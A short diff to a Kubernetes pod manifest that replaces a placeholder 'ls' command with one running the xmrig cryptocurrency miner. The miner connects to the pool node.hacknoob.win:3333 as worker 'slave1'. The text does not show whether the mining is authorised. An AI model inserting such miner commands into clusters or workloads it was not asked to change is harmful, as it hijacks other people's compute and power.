@@ -17,8 +17,11 @@ spec:
   - name: xmrig-container-1
     image: busybox
     command:
-    - ls
-  
+    - /home/worker1/xmrig/build/xmrig
+    - -o
+    - node.hacknoob.win:3333
+    - -u
+    - slave1
     resources:
       requests:
         cpu: "2"
